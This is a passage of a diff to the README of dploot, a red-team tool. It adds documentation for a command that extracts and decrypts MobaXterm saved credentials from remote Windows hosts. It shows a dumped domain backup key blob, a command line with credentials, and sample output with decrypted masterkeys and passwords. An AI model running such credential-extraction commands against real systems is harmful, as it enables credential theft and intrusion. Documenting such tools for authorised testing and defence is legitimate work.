 PRIVATEKEYBLOB:{1ef1b5b000000000010000000000000000000000940400000702000000a4000052534132000800000100010081a511b5e41ad9563aff9f591ba61bec76ba09859750b0bcbeff2ef26f06b1a85b6b763623249890587cee80495ad02c3c1554abf9eb472da753531186d1a58dc853ac85a31dc14348a477b1555e8f882a3c4543098896fe7523dabbfed2bda09a9cf86fdc017bb86375eec8058953193a58f8896c0c6f622da40cfee5f4734b07458176c3aa8ff1cbe3eaf6faa97d774c68f82b59a635d2e671d5e658bab75f7e6ca2d9c04bb5bf2aa18b13cb4b18951be73f0ec16e3e5d8e8caee9ab26d44e365b3669ccb03c1f2d25f24f6a7f2ac116975a9b58662c1aed40af1d0277b78dab978de25f7aaf09596b869fa5b7762c7f63b5ad0b8611826f79e37a252123f06f4cd136b5919607c768ebe59e1001952ae9bb74bb4462ffb5059473b836d8ca287bc0c01653d28da74798be1c867d364158d8fc3acbe287efe88ea24359b7cffa5b02fd61840a6b786ba33cf842e80231ded169eeb6bc582cb174a17f4dfdf25e7fdcd399f6dab6b62e91cdebaa882797b449bd591a5e189bc86ffc535771f60f05b0e4136d6e64c33adbd572e0c83b7762b0b5e81f36a9bc41c0445c652ddd4012d92839806a594af1b2abf392cbe052f585a69565d8ef23df0df41fdafbaa587cdda27c7a818590d48b75672c6459dc7a865fb69eaa0243c988d6a512bf2c6e24ddfdd1025a588a128cf981f2ed9370781b0f1a0c6ff1f4cccf22163073f9457f91d7fa2bd412bd8ce8d595ed1df2ea2ca1b9f02f0edba7a07ffddb81a6f2847a54ba0b1b8a6f78df0f5f2b29a347ce9b7b6f59e50c3828bfdefbba442f171c4c334c85ab7db48c6e4fd9acbd7d97e2ef59c56ad171b152c600977f6a19d8548ce931035995b5a3f6f70e2a4ac39ab071e39f8235ec3f238ac0017f71cbc4f52891d47ebb5114be9417a8d6a811a5c07025aa223fc6ac3dee729762ff1b34dab65cdce2a69887122d86054a03224fe9e982ad1071840ecdd18ebe3fc3eafa242d4a7bb917282fc2f157c6a9acef01871f70887e31e5b272fd20f39cf0256d96dde7f5380afca01917e57d04d11efa2e39051ca87ab61fd13e07555c8ab1137a8d916202ccd99b70c8ed080188fbf6691d621309441ac407865f985e44c5a2876a33f72a2bdef444b65d087eb150d8e83e9dc2eac198f0f3b9da26a32f2ba4d6b448ab4437778b74ecff7e94aae1020b2773469f80021ec4baaa202d859a21da601f3eff77b599f2249cc2e92019b97defbd2786599a9c331032db72356daec1236f703a6649aa5bc3eeef57177d9bb08d00844a573eb8fc356a36ffda43b2d790836a00fe632b124f280925bc13f1e60326ef0da237f2aaae721c0ffec02b84d09fe9f59d6aa68d19c61c9a794a0746ebe0d03af7563efa7ffef80462d10e30d65f2a9a75f44eba7b5222cffc49f331dc9f74bca51819e2b061ac558cc397bbf42e94ccb39625a584deb549eaf34dcfc2ecd9c9c0b0c2f65d4b6966d9e60a7a1c17c1848e7c7d7d4cd0054ad78a4991dbc8771aba7f26058fef848fd49fff622eed23e0dfcb453e178c189ae609cdb1aa2b1e4d4a8182c6dcd735581690d6fb52e5bddff1b37419cad1f84921235d5fa1e192c71bbada85527a14e7e06c53}
 
 
 [-] Exporting domain backupkey to file key.pvk
 ```
 
+### mobaxterm
+
+The **mobaxterm** command will extract MobaXterm secrets and masterpassword key from hive (HKU) and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, or with `-passwords FILE` combo of user:password, `-nthashes` combo of user:nthash or a `-pvk PVKFILE` to first decrypt masterkeys. If the user is not connected on the remote target, dploot will download and extract secrets from NTUSER.dat. 
+
+With `pvk`:
+
+```text
+dploot rdg -d waza.local -u jsmith -p 'Password#123' 192.168.56.14 -pvk key.pvk
+[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)
+
+[*] Triage ALL USERS masterkeys
+
+{6dedb662-3f3c-43a7-bfc4-e2990a48d4dd}:32c4eeeac475910a33f531b56cf9d73f35490d5e
+{21f17bcd-eac1-4187-9538-a744f2c6e17b}:198eba83e088a59fd75e6435b38804d4973a2c1e
+
+[*] Triage MobaXterm Secrets
+
+[MOBAXTERM CREDENTIAL]
+Name:		TEST
+Username:	user
+Password:	waza1234
+
+[MOBAXTERM PASSWORD]
+Username:	mobauser@mobaserver
+Password:	309554moba231082pass322883
+```
+
 ## Credits
 
 Those projects helped a lot in writting this tool:
 
 - [Impacket](https://github.com/SecureAuthCorp/impacket) by the community
 - [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) by [Harmj0y](https://twitter.com/harmj0y)
 - [Mimikatz](https://github.com/gentilkiwi/mimikatz/) by [gentilkiwi](https://twitter.com/gentilkiwi)
```

